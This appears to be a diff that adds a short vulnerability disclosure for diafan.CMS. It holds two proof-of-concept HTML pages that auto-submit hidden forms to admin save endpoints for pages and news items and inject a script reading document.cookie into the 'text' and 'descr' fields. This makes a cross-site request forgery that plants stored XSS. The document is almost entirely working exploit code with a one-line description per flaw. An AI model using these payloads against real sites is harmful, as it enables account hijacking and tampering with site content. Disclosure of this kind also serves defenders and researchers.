@@ -1,0 +1,49 @@
+Stored XSS vulnerability in diafan.CMS
+
+An attacker can use browser to exploit this vulnerability. The following PoC is available:
+&lt;form action=&quot;http://host/admin/site/save2/&quot; method=&quot;post&quot; name=&quot;main&quot; enctype=&quot;multipart/form-data&quot; &gt;
+&lt;input type=&quot;hidden&quot; name=&quot;noOut&quot; value=&quot;1&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;save_post&quot; value=&quot;1&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;2&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;name&quot; value=&quot;page name&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;1&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;actm&quot; value=&quot;1&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;title_meta&quot; value=&quot;title&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;keywords&quot; value=&quot;&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;descr&quot; value=&quot;&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;rewrite&quot; value=&quot;sef_url&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;addmodule&quot; value=&quot;&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;parent_id&quot; value=&quot;&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;sort&quot; value=&quot;2&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;theme&quot; value=&quot;&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;othurl&quot; value=&quot;&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;text&quot; value=&#039;content html&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#039;&gt;
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
+
+XSS vulnerability in diafan.CMS
+
+An attacker can use browser to exploit this vulnerability. The following PoC is available:
+&lt;form action=&quot;http://host/admin/news/saveNEWS_ID/&quot; method=&quot;post&quot; name=&quot;main&quot; enctype=&quot;multipart/form-data&quot; &gt;
+&lt;input type=&quot;hidden&quot; name=&quot;noOut&quot; value=&quot;1&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;save_post&quot; value=&quot;1&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;NEWS_ID&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;name&quot; value=&quot;news name&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;created&quot; value=&quot;23.12.2010 09:02&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;photo&quot; value=&quot;&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;1&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;tag&quot; value=&quot;&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;title_meta&quot; value=&quot;&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;keywords&quot; value=&quot;&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;descr&quot; value=&#039;desc&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#039;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;rewrite&quot; value=&quot;&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;site_id&quot; value=&quot;5&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;anons&quot; value=&#039;announce&#039;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;text&quot; value=&quot;news_text&quot;&gt;
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
+
